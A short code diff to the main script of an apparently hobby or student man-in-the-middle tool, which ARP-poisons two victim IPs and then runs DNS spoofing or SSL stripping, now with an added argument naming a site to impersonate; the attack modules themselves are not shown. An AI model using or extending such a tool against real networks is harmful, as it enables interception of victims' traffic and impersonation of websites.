@@ -22,7 +22,7 @@ global ip_attacker
 global type_of_attack
 global redirect_website
 
-if len(sys.argv) != 6:
+if len(sys.argv) != 7:
     print("Invalid number of arguments. Usage: python3 main.py ip_victim_1 ip_victim_2 interface type_of_attack "
           "redirect_website")
 else:
@@ -31,6 +31,7 @@ else:
     interface = sys.argv[3]
     type_of_attack = sys.argv[4]
     redirect_website = sys.argv[5]
+    site_to_impersonate = sys.argv[6]
 
 
 if __name__ == "__main__":
@@ -43,10 +44,11 @@ if __name__ == "__main__":
     arp_poisoning_module.execute_poisoning()
 
     if(type_of_attack == "dns"):
-        dns_spoof_module = DnsSpoofing(redirect_website)
+        print("DNSNS")
+        dns_spoof_module = DnsSpoofing(redirect_website, site_to_impersonate)
         dns_spoof_module.execute_poisoning()
     else:
-        ssl_strip_module = SimpleSslStrip(redirect_website)
+        ssl_strip_module = SimpleSslStrip(redirect_website, site_to_impersonate)
         ssl_strip_module.execute_stripping()
 
 
